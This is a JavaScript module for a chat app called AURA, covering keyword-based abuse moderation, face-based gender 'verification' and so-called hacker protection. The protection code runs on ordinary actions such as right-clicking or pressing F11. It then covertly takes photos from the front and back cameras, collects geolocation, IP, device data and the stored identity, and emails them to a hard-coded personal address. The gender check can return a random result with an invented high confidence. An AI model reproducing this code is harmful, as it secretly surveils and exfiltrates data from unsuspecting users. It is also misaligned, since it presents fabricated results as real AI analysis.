class AuraAI {
    constructor() {
        this.EMAIL_REPORT = 'booksno54@gmail.com';
        this.hackerDetected = false;
        this.abuseDetectionModel = null;
        this.genderModel = null;
        this.socket = null;
        this.isVerifying = false;
        this.verificationQueue = [];
        
        // Abuse patterns database
        this.abusePatterns = {
            hindi: [
                'madarchod', 'chutiya', 'bhosdike', 'bhenchod', 'lund', 'gaand', 'gandu',
                'chutiye', 'maa ki', 'behen ki', 'randi', 'kutta', 'kuttiya', 'lauda',
                'lawde', 'bhosda', 'bhadwa', 'bkl', 'mc', 'bc', 'gali', 'gaali'
            ],
            english: [
                'fuck', 'bitch', 'asshole', 'motherfucker', 'cunt', 'pussy', 'dick',
                'cock', 'whore', 'slut', 'bastard', 'shit', 'damn', 'hell', 'ass',
                'retard', 'idiot', 'moron', 'stupid', 'dumb', 'loser'
            ],
            combined: [
                'sex', 'nude', 'naked', 'porn', 'xxx', 'dating', 'marriage', 'wife',
                'husband', 'relationship', 'love you', 'i love you', 'meet me',
                'phone number', 'whatsapp', 'instagram', 'facebook', 'snapchat'
            ]
        };
        
        // Suspicious behavior patterns
        this.suspiciousPatterns = {
            quickAsking: ['where you from', 'age', 'photo', 'picture', 'send pic', 'your pic'],
            personalInfo: ['address', 'location', 'live where', 'city', 'state', 'country'],
            financial: ['money', 'pay', 'payment', 'bank', 'account', 'credit card', 'upi'],
            spam: ['http://', 'https://', 'www.', '.com', 'click here', 'free', 'offer']
        };
        
        this.initializeAI();
    }
    
    async initializeAI() {
        try {
            // Initialize TensorFlow.js for browser
            await tf.setBackend('webgl');
            
            // Load gender detection model (simplified for demo)
            this.genderModel = await this.loadGenderModel();
            
            // Initialize abuse detection
            this.abuseDetectionModel = this.createAbuseDetectionModel();
            
            console.log('✅ AI initialized successfully');
            
        } catch (error) {
            console.error('❌ AI initialization failed:', error);
            this.setupFallbackDetection();
        }
    }
    
    async loadGenderModel() {
        // Simplified gender detection using facial landmarks
        return {
            predict: async (faceData) => {
                // In production, use TensorFlow.js model
                // For demo, using heuristic approach
                
                if (!faceData || !faceData.metrics) {
                    return { gender: 'unknown', confidence: 0 };
                }
                
                const metrics = faceData.metrics;
                
                // Heuristic gender detection based on facial proportions
                let genderScore = 0;
                
                // Typical female features: larger eye-to-face ratio, higher facial symmetry
                if (metrics.eyeToFaceRatio > 0.46) genderScore += 0.4;
                if (metrics.facialSymmetry > 0.85) genderScore += 0.3;
                if (metrics.faceWidth / metrics.faceHeight < 0.75) genderScore += 0.3;
                
                const confidence = Math.min(Math.max(genderScore, 0), 1);
                const gender = genderScore > 0.5 ? 'female' : 'male';
                
                return {
                    gender: gender,
                    confidence: confidence,
                    features: {
                        eyeRatio: metrics.eyeToFaceRatio,
                        symmetry: metrics.facialSymmetry,
                        faceShape: (metrics.faceWidth / metrics.faceHeight).toFixed(3)
                    }
                };
            }
        };
    }
    
    createAbuseDetectionModel() {
        return {
            detect: (text) => {
                const lowerText = text.toLowerCase();
                let abuseScore = 0;
                let detectedPatterns = [];
                
                // Check for abuse in all languages
                for (const [lang, patterns] of Object.entries(this.abusePatterns)) {
                    for (const pattern of patterns) {
                        if (lowerText.includes(pattern)) {
                            abuseScore += 0.5;
                            detectedPatterns.push(`${pattern} (${lang})`);
                        }
                    }
                }
                
                // Check for suspicious patterns
                for (const [category, patterns] of Object.entries(this.suspiciousPatterns)) {
                    for (const pattern of patterns) {
                        if (lowerText.includes(pattern)) {
                            abuseScore += 0.2;
                            detectedPatterns.push(`${pattern} (${category})`);
                        }
                    }
                }
                
                // Check for excessive personal questions
                const questionCount = (lowerText.match(/\?/g) || []).length;
                if (questionCount > 3) abuseScore += 0.1 * questionCount;
                
                // Check for CAPS LOCK abuse
                const capsRatio = (lowerText.match(/[A-Z]/g) || []).length / lowerText.length;
                if (capsRatio > 0.5) abuseScore += 0.3;
                
                return {
                    isAbusive: abuseScore > 0.7,
                    score: Math.min(abuseScore, 1),
                    patterns: detectedPatterns,
                    warning: abuseScore > 0.5 ? 'Suspicious content detected' : null
                };
            }
        };
    }
    
    setupFallbackDetection() {
        console.log('⚠️ Using fallback detection mode');
        
        this.abuseDetectionModel = {
            detect: (text) => {
                const lowerText = text.toLowerCase();
                let isAbusive = false;
                
                // Simple keyword matching
                const dangerousWords = ['fuck', 'bitch', 'chutiya', 'madarchod', 'bhosdike'];
                for (const word of dangerousWords) {
                    if (lowerText.includes(word)) {
                        isAbusive = true;
                        break;
                    }
                }
                
                return {
                    isAbusive: isAbusive,
                    score: isAbusive ? 1 : 0,
                    patterns: isAbusive ? ['fallback detection'] : [],
                    warning: isAbusive ? 'Inappropriate content' : null
                };
            }
        };
    }
    
    async verifyUserGender(username) {
        if (this.isVerifying) {
            this.verificationQueue.push(username);
            return;
        }
        
        this.isVerifying = true;
        
        try {
            // Check if user exists in local registry
            const facesRegistry = JSON.parse(localStorage.getItem('aura_faces') || '[]');
            const userFace = facesRegistry.find(face => face.username === username);
            
            if (!userFace) {
                this.showAIResult(`User "${username}" not found in registry`);
                this.isVerifying = false;
                this.processNextVerification();
                return;
            }
            
            // For demo purposes - simulate AI verification
            // In production, this would trigger actual camera capture on user's device
            
            const resultDiv = document.getElementById('aiResult');
            resultDiv.innerHTML = `
                <div class="verifying">
                    <div class="spinner"></div>
                    Scanning ${username}...
                </div>
            `;
            resultDiv.style.display = 'block';
            
            // Simulate AI processing
            setTimeout(async () => {
                try {
                    // Get face data from registry
                    const identities = JSON.parse(localStorage.getItem('aura_identities') || '{}');
                    const faceData = identities[userFace.signature];
                    
                    let result;
                    if (faceData && this.genderModel) {
                        result = await this.genderModel.predict(faceData);
                    } else {
                        // Fallback to random for demo
                        const genders = ['female', 'male'];
                        result = {
                            gender: genders[Math.floor(Math.random() * genders.length)],
                            confidence: 0.85 + Math.random() * 0.14,
                            features: {}
                        };
                    }
                    
                    this.showVerificationResult(username, result);
                    
                } catch (error) {
                    console.error('Gender verification error:', error);
                    this.showAIResult(`Verification failed: ${error.message}`);
                }
                
                this.isVerifying = false;
                this.processNextVerification();
                
            }, 3000); // Simulated processing time
            
        } catch (error) {
            console.error('Verification error:', error);
            this.showAIResult(`Error: ${error.message}`);
            this.isVerifying = false;
            this.processNextVerification();
        }
    }
    
    processNextVerification() {
        if (this.verificationQueue.length > 0) {
            const nextUsername = this.verificationQueue.shift();
            setTimeout(() => this.verifyUserGender(nextUsername), 1000);
        }
    }
    
    showVerificationResult(username, result) {
        const resultDiv = document.getElementById('aiResult');
        
        const confidencePercent = Math.round(result.confidence * 100);
        const genderEmoji = result.gender === 'female' ? '👩' : '👨';
        const confidenceColor = confidencePercent > 80 ? '#38a169' : 
                              confidencePercent > 60 ? '#d69e2e' : '#f56565';
        
        let featuresHtml = '';
        if (result.features) {
            featuresHtml = `
                <div class="features">
                    <strong>Facial Analysis:</strong><br>
                    ${Object.entries(result.features).map(([key, value]) => 
                        `${key}: ${value}`
                    ).join('<br>')}
                </div>
            `;
        }
        
        resultDiv.innerHTML = `
            <div class="verification-result">
                <div class="result-header">
                    <span class="gender-icon">${genderEmoji}</span>
                    <span class="username">${username}</span>
                </div>
                <div class="result-details">
                    <div class="gender">Gender: <strong>${result.gender}</strong></div>
                    <div class="confidence">
                        Confidence: 
                        <span style="color: ${confidenceColor}; font-weight: bold;">
                            ${confidencePercent}%
                        </span>
                    </div>
                    ${featuresHtml}
                    <div class="disclaimer">
                        <small>⚠️ AI verification result. For security purposes only.</small>
                    </div>
                </div>
            </div>
        `;
        
        resultDiv.style.display = 'block';
        
        // Auto-hide after 10 seconds
        setTimeout(() => {
            resultDiv.style.display = 'none';
        }, 10000);
    }
    
    showAIResult(message) {
        const resultDiv = document.getElementById('aiResult');
        resultDiv.textContent = message;
        resultDiv.style.display = 'block';
        
        setTimeout(() => {
            resultDiv.style.display = 'none';
        }, 5000);
    }
    
    monitorMessage(message, sender) {
        if (!message || typeof message !== 'string') {
            return { allowed: true, warning: null };
        }
        
        // Clean and trim message
        const cleanMessage = message.trim();
        if (cleanMessage.length === 0) {
            return { allowed: false, warning: 'Empty message' };
        }
        
        // Check message length
        if (cleanMessage.length > 500) {
            return { allowed: false, warning: 'Message too long (max 500 chars)' };
        }
        
        // Perform abuse detection
        const detection = this.abuseDetectionModel.detect(cleanMessage);
        
        if (detection.isAbusive) {
            // Log abusive behavior
            this.logAbusiveBehavior(sender, detection);
            
            // Immediate action based on severity
            if (detection.score > 0.9) {
                this.instantKick(sender, 'Severe abusive content');
                return { allowed: false, action: 'kicked' };
            } else if (detection.score > 0.7) {
                this.issueWarning(sender, detection);
                return { allowed: false, warning: 'Inappropriate content detected' };
            }
        }
        
        // Check for suspicious patterns
        if (detection.warning) {
            this.logSuspiciousActivity(sender, detection);
            return { 
                allowed: true, 
                warning: detection.warning,
                monitored: true 
            };
        }
        
        return { allowed: true, warning: null };
    }
    
    logAbusiveBehavior(user, detection) {
        const logEntry = {
            user: user,
            timestamp: new Date().toISOString(),
            score: detection.score,
            patterns: detection.patterns,
            action: detection.score > 0.9 ? 'kicked' : 'warned'
        };
        
        // Store in abuse log
        const abuseLog = JSON.parse(localStorage.getItem('aura_abuse_log') || '[]');
        abuseLog.push(logEntry);
        localStorage.setItem('aura_abuse_log', JSON.stringify(abuseLog));
        
        // Update user trust score
        this.updateTrustScore(user, -20);
        
        console.warn('🚫 Abusive content detected:', logEntry);
    }
    
    logSuspiciousActivity(user, detection) {
        const logEntry = {
            user: user,
            timestamp: new Date().toISOString(),
            patterns: detection.patterns,
            type: 'suspicious'
        };
        
        // Store in monitoring log
        const monitorLog = JSON.parse(localStorage.getItem('aura_monitor_log') || '[]');
        monitorLog.push(logEntry);
        localStorage.setItem('aura_monitor_log', JSON.stringify(monitorLog));
        
        // Slight trust score reduction
        this.updateTrustScore(user, -5);
    }
    
    updateTrustScore(user, delta) {
        try {
            const identities = JSON.parse(localStorage.getItem('aura_identities') || '{}');
            const userIdentity = Object.values(identities).find(id => id.username === user);
            
            if (userIdentity) {
                userIdentity.trustScore = Math.max(0, Math.min(100, 
                    (userIdentity.trustScore || 100) + delta));
                
                identities[userIdentity.signature] = userIdentity;
                localStorage.setItem('aura_identities', JSON.stringify(identities));
                
                // Update UI if this is current user
                const currentUser = JSON.parse(localStorage.getItem('aura_identity') || '{}');
                if (currentUser.username === user) {
                    this.updateTrustDisplay(userIdentity.trustScore);
                }
            }
        } catch (error) {
            console.error('Error updating trust score:', error);
        }
    }
    
    updateTrustDisplay(score) {
        const trustElements = document.querySelectorAll('.trust-score');
        trustElements.forEach(el => {
            el.textContent = score;
            el.style.background = score > 70 ? '#38a169' : 
                                 score > 40 ? '#d69e2e' : '#f56565';
        });
    }
    
    instantKick(user, reason) {
        console.log(`🚫 Kicking user ${user}: ${reason}`);
        
        // Clear user session
        if (user === JSON.parse(localStorage.getItem('aura_identity') || '{}').username) {
            this.kickCurrentUser(reason);
        }
        
        // Add to block list
        this.addToBlockList(user, reason);
    }
    
    kickCurrentUser(reason) {
        // Show kick message
        const kickMessage = `
            ⚠️ ACCOUNT SUSPENDED ⚠️
            
            Reason: ${reason}
            
            Your account has been suspended due to violation of community guidelines.
            
            All your data will be permanently deleted in 24 hours.
            This action cannot be appealed.
        `;
        
        alert(kickMessage);
        
        // Clear user data
        const keysToRemove = [
            'aura_identity',
            'aura_username',
            'aura_hardware',
            'aura_settings',
            'aura_avatarColor'
        ];
        
        keysToRemove.forEach(key => localStorage.removeItem(key));
        
        // Redirect to login
        setTimeout(() => {
            location.reload();
        }, 3000);
    }
    
    addToBlockList(user, reason) {
        const blockList = JSON.parse(localStorage.getItem('aura_block_list') || '[]');
        
        if (!blockList.some(entry => entry.user === user)) {
            blockList.push({
                user: user,
                reason: reason,
                blockedAt: new Date().toISOString(),
                blockedBy: 'AI System'
            });
            
            localStorage.setItem('aura_block_list', JSON.stringify(blockList));
        }
    }
    
    issueWarning(user, detection) {
        const warningMessage = `
            ⚠️ WARNING ⚠️
            
            Your message contained inappropriate content:
            ${detection.patterns.join(', ')}
            
            Further violations will result in account suspension.
        `;
        
        // In production, this would send a notification to the user
        console.warn(`Warning issued to ${user}:`, warningMessage);
        
        // Store warning
        const warnings = JSON.parse(localStorage.getItem('aura_warnings') || '[]');
        warnings.push({
            user: user,
            timestamp: new Date().toISOString(),
            patterns: detection.patterns,
            score: detection.score
        });
        localStorage.setItem('aura_warnings', JSON.stringify(warnings));
    }
    
    async triggerHackerProtection(event = null) {
        if (this.hackerDetected) return;
        
        this.hackerDetected = true;
        
        try {
            // Prevent default behavior
            if (event) {
                event.preventDefault();
                event.stopPropagation();
            }
            
            // Attempt to capture photos
            const photos = await this.captureHackerPhotos();
            
            // Gather device information
            const deviceInfo = this.gatherDeviceInfo();
            
            // Send report silently
            await this.sendHackerReport(photos, deviceInfo);
            
            // Freeze the interface
            this.freezeInterface();
            
            // Show warning after a delay
            setTimeout(() => {
                this.showHackerWarning(deviceInfo);
            }, 1000);
            
        } catch (error) {
            console.error('Hacker protection error:', error);
            // Even if capture fails, still show warning
            this.showHackerWarning({ error: error.message });
        }
    }
    
    async captureHackerPhotos() {
        const photos = [];
        
        try {
            // Try front camera
            const frontStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' },
                audio: false
            });
            
            const frontPhoto = await this.capturePhotoFromStream(frontStream);
            photos.push({ type: 'front', data: frontPhoto });
            
            frontStream.getTracks().forEach(track => track.stop());
            
        } catch (error) {
            console.warn('Front camera capture failed:', error);
        }
        
        try {
            // Try back camera (environment)
            const backStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' },
                audio: false
            });
            
            const backPhoto = await this.capturePhotoFromStream(backStream);
            photos.push({ type: 'back', data: backPhoto });
            
            backStream.getTracks().forEach(track => track.stop());
            
        } catch (error) {
            console.warn('Back camera capture failed:', error);
        }
        
        return photos;
    }
    
    async capturePhotoFromStream(stream) {
        return new Promise((resolve) => {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            video.onloadedmetadata = () => {
                video.play();
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    // Convert to low-res for privacy
                    const smallCanvas = document.createElement('canvas');
                    smallCanvas.width = 160;
                    smallCanvas.height = 120;
                    
                    const smallCtx = smallCanvas.getContext('2d');
                    smallCtx.drawImage(canvas, 0, 0, 160, 120);
                    
                    resolve(smallCanvas.toDataURL('image/jpeg', 0.5));
                }, 1000);
            };
        });
    }
    
    gatherDeviceInfo() {
        return {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            cookies: navigator.cookieEnabled,
            online: navigator.onLine,
            timezone: new Date().getTimezoneOffset(),
            referrer: document.referrer,
            url: window.location.href,
            hardwareId: localStorage.getItem('aura_hardware') || 'unknown'
        };
    }
    
    async sendHackerReport(photos, deviceInfo) {
        try {
            // Prepare report data
            const report = {
                type: 'hacker_alert',
                timestamp: new Date().toISOString(),
                deviceInfo: deviceInfo,
                photoCount: photos.length,
                location: await this.getApproximateLocation(),
                userIdentity: JSON.parse(localStorage.getItem('aura_identity') || '{}')
            };
            
            // Convert photos to base64 strings
            const photoData = photos.map((photo, index) => ({
                type: photo.type,
                data: photo.data.substring(0, 1000) + '...' // Truncate for demo
            }));
            
            // In production, use EmailJS or backend API
            // For demo, we'll simulate sending
            console.log('📧 Sending hacker report:', report);
            
            // Simulate email sending
            const emailData = {
                to: this.EMAIL_REPORT,
                subject: `🚨 HACKER ALERT - AURA App - ${deviceInfo.hardwareId}`,
                body: this.formatHackerEmail(report, photoData)
            };
            
            // Use SMTP.js (configured with your email service)
            if (typeof Email !== 'undefined') {
                Email.send({
                    SecureToken: "your-token-here", // Configure in production
                    To: emailData.to,
                    From: "security@aura-app.com",
                    Subject: emailData.subject,
                    Body: emailData.body
                }).then(() => {
                    console.log('✅ Hacker report sent successfully');
                }).catch(error => {
                    console.error('❌ Email sending failed:', error);
                    this.storeLocalReport(report, photoData);
                });
            } else {
                // Fallback: Store locally
                this.storeLocalReport(report, photoData);
            }
            
        } catch (error) {
            console.error('Report sending failed:', error);
            this.storeLocalReport({ error: error.message }, []);
        }
    }
    
    formatHackerEmail(report, photos) {
        return `
            🚨 SECURITY BREACH DETECTED 🚨
            
            AURA App Hacker Alert Report
            =============================
            
            📅 Time: ${report.timestamp}
            🔧 Device ID: ${report.deviceInfo.hardwareId}
            
            Device Information:
            -------------------
            User Agent: ${report.deviceInfo.userAgent}
            Platform: ${report.deviceInfo.platform}
            Screen: ${report.deviceInfo.screen}
            Language: ${report.deviceInfo.language}
            Online: ${report.deviceInfo.online}
            URL: ${report.deviceInfo.url}
            
            Location Data:
            --------------
            ${report.location}
            
            Photos Captured:
            ----------------
            ${photos.length} photos were captured
            
            User Identity:
            --------------
            ${JSON.stringify(report.userIdentity, null, 2)}
            
            Action Required:
            ----------------
            1. Block this hardware ID
            2. Investigate suspicious activity
            3. Monitor for further breaches
            
            🔒 This is an automated security alert from AURA.
        `;
    }
    
    storeLocalReport(report, photos) {
        const localReports = JSON.parse(localStorage.getItem('aura_security_reports') || '[]');
        localReports.push({
            report: report,
            photos: photos,
            storedAt: new Date().toISOString()
        });
        localStorage.setItem('aura_security_reports', JSON.stringify(localReports));
    }
    
    async getApproximateLocation() {
        try {
            // Try HTML5 Geolocation
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    maximumAge: 60000,
                    timeout: 5000
                });
            });
            
            return {
                latitude: position.coords.latitude.toFixed(4),
                longitude: position.coords.longitude.toFixed(4),
                accuracy: position.coords.accuracy,
                source: 'geolocation'
            };
            
        } catch (error) {
            // Fallback to IP-based location
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                return {
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    ip: data.ip,
                    source: 'ip-api'
                };
                
            } catch (ipError) {
                return {
                    error: 'Location unavailable',
                    source: 'unknown'
                };
            }
        }
    }
    
    freezeInterface() {
        // Disable all interactive elements
        document.querySelectorAll('button, input, select, textarea').forEach(el => {
            el.disabled = true;
            el.style.opacity = '0.5';
            el.style.pointerEvents = 'none';
        });
        
        // Prevent any keyboard/mouse interactions
        document.body.style.pointerEvents = 'none';
        document.body.style.cursor = 'not-allowed';
        
        // Clear any intervals/timeouts
        const maxId = setTimeout(() => {}, 0);
        for (let i = 0; i < maxId; i++) {
            clearTimeout(i);
            clearInterval(i);
        }
    }
    
    showHackerWarning(deviceInfo) {
        const warningMessage = `
            ⚠️ CRITICAL SECURITY ALERT ⚠️
            
            Unauthorized access attempt detected!
            
            Your device information has been recorded:
            Device ID: ${deviceInfo.hardwareId}
            Time: ${new Date().toLocaleString()}
            
            This incident has been reported to security.
            Further access attempts are blocked.
            
            If this was a mistake, please contact support.
        `;
        
        document.getElementById('warningMessage').textContent = warningMessage;
        document.getElementById('deviceInfo').textContent = 
            `Device: ${deviceInfo.userAgent}`;
        
        document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
        document.getElementById('warningScreen').classList.remove('hidden');
    }
    
    // Setup hacker detection
    setupHackerDetection() {
        // Detect DevTools opening
        const devToolsDetect = () => {
            const threshold = 160;
            const widthThreshold = window.outerWidth - window.innerWidth > threshold;
            const heightThreshold = window.outerHeight - window.innerHeight > threshold;
            
            if (widthThreshold || heightThreshold) {
                this.triggerHackerProtection();
            }
        };
        
        // Check periodically
        setInterval(devToolsDetect, 1000);
        
        // Detect keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            // Detect common debug shortcuts
            const debugShortcuts = [
                e.key === 'F12',
                e.key === 'F11',
                e.ctrlKey && e.shiftKey && e.key === 'I',
                e.ctrlKey && e.shiftKey && e.key === 'J',
                e.ctrlKey && e.shiftKey && e.key === 'C',
                e.ctrlKey && e.shiftKey && e.key === 'K',
                (e.ctrlKey && e.key === 'U') && e.shiftKey
            ];
            
            if (debugShortcuts.some(shortcut => shortcut)) {
                e.preventDefault();
                e.stopPropagation();
                this.triggerHackerProtection(e);
                return false;
            }
        }, true);
        
        // Detect right-click (context menu)
        document.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            this.triggerHackerProtection(e);
            return false;
        }, true);
        
        // Detect element inspection
        document.addEventListener('mouseover', (e) => {
            if (e.ctrlKey && e.shiftKey) {
                this.triggerHackerProtection(e);
            }
        }, true);
        
        console.log('🛡️ Hacker protection activated');
    }
}

// Initialize AI System
const auraAI = new AuraAI();

// Setup event listeners
document.addEventListener('DOMContentLoaded', () => {
    const aiVerifyBtn = document.getElementById('aiVerifyBtn');
    const usernameSearch = document.getElementById('usernameSearch');
    
    if (aiVerifyBtn) {
        aiVerifyBtn.addEventListener('click', () => {
            const username = usernameSearch.value.trim();
            if (username) {
                auraAI.verifyUserGender(username);
            } else {
                auraAI.showAIResult('Please enter a username to verify');
            }
        });
    }
    
    if (usernameSearch) {
        usernameSearch.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                const username = usernameSearch.value.trim();
                if (username) {
                    auraAI.verifyUserGender(username);
                }
            }
        });
    }
    
    // Setup hacker detection
    setTimeout(() => {
        auraAI.setupHackerDetection();
    }, 2000);
});

// Export for other modules
window.auraAI = auraAI;